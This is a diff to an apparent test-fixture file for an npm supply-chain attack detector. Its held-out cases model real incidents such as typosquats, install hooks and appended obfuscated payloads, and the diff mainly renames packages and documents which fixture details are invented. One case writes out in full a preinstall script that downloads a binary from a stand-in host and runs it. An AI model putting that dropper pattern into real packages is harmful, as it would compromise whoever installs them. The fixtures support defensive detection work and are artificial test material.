@@ -89,7 +89,7 @@ const MASTRA_SETUP = obfuscate(`  process.env[@@NODE_TLS_REJECT_UNAUTHORIZED@@] 
 `, 17, 60);
 const DAYJS_LIKE = `module.exports = function dayjs(d) { const t = d === undefined ? new Date() : new Date(d); return { format: () => t.toISOString(), valueOf: () => t.getTime() }; };\n`;
 const mastraHost = (version: string, deps: Record<string, string> | undefined): Pkg =>
-  lib("flow-agent", version, { ...(deps ? { dependencies: deps } : {}) }, { "index.js": `module.exports = { run: (task) => task() };\n` });
+  lib("flow-agent-kit-x", version, deps ? { dependencies: deps } : {}, { "index.js": `module.exports = { run: (task) => task() };\n` });
 
 // Red Hat wave style: the entry file of a package is replaced by a much larger obfuscated bundle; nothing else changes.
 const UI_PARTS_OLD = Array.from({ length: 30 }, (_, i) => `exports.part${i} = (props) => ({ type: "part${i}", props });\n`).join("");
@@ -118,8 +118,8 @@ export const HELDOUT: HeldOutCase[] = [
     id: "keyv-style-preinstall-worm", kind: "attack", expect: "hold", disclosed: "2026-08-05",
     source: "https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack",
     note: "patch release adds a preinstall script running a new setup.mjs that downloads and starts a second stage",
-    base: [lib("kv-store", "5.3.1", {}, { "index.js": `module.exports = new Map();\n` })],
-    head: [lib("kv-store", "5.3.2", { scripts: { preinstall: "node setup.mjs" } }, { "index.js": `module.exports = new Map();\n`, "setup.mjs": STAGE })],
+    base: [lib("kv-store-lite-x", "5.3.1", {}, { "index.js": `module.exports = new Map();\n` })],
+    head: [lib("kv-store-lite-x", "5.3.2", { scripts: { preinstall: "node setup.mjs" } }, { "index.js": `module.exports = new Map();\n`, "setup.mjs": STAGE })],
   },
   {
     id: "node-gyp-style-binding-gyp", kind: "attack", expect: "hold", disclosed: "2026-06-03",
@@ -132,15 +132,15 @@ export const HELDOUT: HeldOutCase[] = [
     id: "jscrambler-style-preinstall-binary", kind: "attack", expect: "hold", disclosed: "2026-07-11",
     source: "https://jscrambler.com/blog/security-incident-postmortem-jscrambler/",
     note: "minor release adds a preinstall hook that downloads a native binary and runs it",
-    base: [lib("code-guard", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
-    head: [lib("code-guard", "8.18.0", { scripts: { preinstall: "node fetch-tool.js" } }, { "index.js": `module.exports = { protect: (s) => s };\n`, "fetch-tool.js": `const https = require("https");\nconst { execFileSync } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/guard-helper";\nhttps.get("https://stage.example/guard-helper", (r) => { r.pipe(fs.createWriteStream(dest, { mode: 0o755 })).on("close", () => execFileSync(dest, { stdio: "ignore" })); });\n` })],
+    base: [lib("code-guard-pro-x", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
+    head: [lib("code-guard-pro-x", "8.18.0", { scripts: { preinstall: "node fetch-tool.js" } }, { "index.js": `module.exports = { protect: (s) => s };\n`, "fetch-tool.js": `const https = require("https");\nconst { execFileSync } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/guard-helper";\nhttps.get("https://stage.example/guard-helper", (r) => { r.pipe(fs.createWriteStream(dest, { mode: 0o755 })).on("close", () => execFileSync(dest, { stdio: "ignore" })); });\n` })],
   },
   {
     id: "node-ipc-style-appended-require-payload", kind: "attack", expect: "hold", disclosed: "2026-05-14",
     source: "https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack",
     note: "patch release, no install script: an obfuscated block is appended to the CommonJS bundle after module.exports and runs when the package is required; the ESM entry is unchanged",
-    base: [lib("ipc-bus", "12.0.0", IPC_MANIFEST, { "ipc.cjs": IPC_BASE, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
-    head: [lib("ipc-bus", "12.0.1", IPC_MANIFEST, { "ipc.cjs": IPC_BASE + IPC_TAIL, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
+    base: [lib("ipc-bus-lite-x", "12.0.0", IPC_MANIFEST, { "ipc.cjs": IPC_BASE, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
+    head: [lib("ipc-bus-lite-x", "12.0.1", IPC_MANIFEST, { "ipc.cjs": IPC_BASE + IPC_TAIL, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
   },
   {
     id: "tanstack-style-git-optional-dependency", kind: "attack", expect: "hold", disclosed: "2026-05-11",
@@ -152,7 +152,7 @@ export const HELDOUT: HeldOutCase[] = [
   {
     id: "mastra-style-typosquat-dependency-postinstall", kind: "attack", expect: "hold", disclosed: "2026-06-17",
     source: "https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/",
-    note: "the host package's only change is one new dependency on a name one letter off a popular date library; the range resolves to a patch release whose only addition over the clean one is a postinstall running an obfuscated dropper (the library file is the same). The host bump here is 1.13.0 to 1.13.1 and the resolved dependency is new at 1.11.22, as in the write-up; the write-up's own text does not give the tarball contents beyond those two files",
+    note: "the host package's only change is one new dependency on a look-alike of a popular date library with a prefix added; the range resolves to a patch release whose only addition over the clean one is a postinstall running an obfuscated dropper (the write-up says the library file, dayjs.min.js, is byte-identical to the clean bait version and gives the dropper size). Host bump 1.13.0 to 1.13.1, resolved dependency 1.11.22, as in the write-up. The index.js wrapper is invented. The dropper body is also invented: the write-up describes a GET of a second stage, two marker files (one XOR-encoded), a self-delete and base64 strings, while the fixture POSTs to a .example path, writes one marker, does not delete itself and uses a hex table",
     base: [mastraHost("1.13.0", undefined)],
     head: [mastraHost("1.13.1", { "swift-day-js": "^1.11.21" }),
       lib("swift-day-js", "1.11.22", { scripts: { postinstall: "node setup.cjs --no-warnings" } }, { "dayjs.min.js": DAYJS_LIKE, "index.js": `module.exports = require("./dayjs.min.js");\n`, "setup.cjs": MASTRA_SETUP })],
@@ -168,7 +168,7 @@ export const HELDOUT: HeldOutCase[] = [
     id: "antv-wave-style-preinstall-bun", kind: "attack", expect: "hold", disclosed: "2026-05-19",
     source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
     note: "2.2.0 to 2.4.0: the write-up gives the version jump past the latest release, a preinstall hook \"bun run index.js\", the bun runtime added as a dependency and a git optionalDependency on an orphaned commit; the payload posts to a host that mimics trace ingestion. The runtime dependency and the git dependency are listed in the manifest but not modeled as packages, and the write-up gives no commit id, so the hash here is invented",
-    base: [lib("chart-vue", "2.2.0", {}, { "lib.js": `module.exports = { draw: (el) => el };\n` })],
-    head: [lib("chart-vue", "2.4.0", { scripts: { preinstall: "bun run index.js" }, dependencies: { bun: "1.2.0" }, optionalDependencies: { "chart-core": "github:example-org/example-chart#4f2a9c1d7e8b3a5069d1c2e4f6a8b0c3d5e7f901" } }, { "lib.js": `module.exports = { draw: (el) => el };\n`, "index.js": ANTV_PAYLOAD })],
+    base: [lib("chart-vue", "2.2.0", { main: "lib.js" }, { "lib.js": `module.exports = { draw: (el) => el };\n` })],
+    head: [lib("chart-vue", "2.4.0", { main: "lib.js", scripts: { preinstall: "bun run index.js" }, dependencies: { bun: "1.2.0" }, optionalDependencies: { "chart-core": "github:example-org/example-chart#4f2a9c1d7e8b3a5069d1c2e4f6a8b0c3d5e7f901" } }, { "lib.js": `module.exports = { draw: (el) => el };\n`, "index.js": ANTV_PAYLOAD })],
   },
 ];
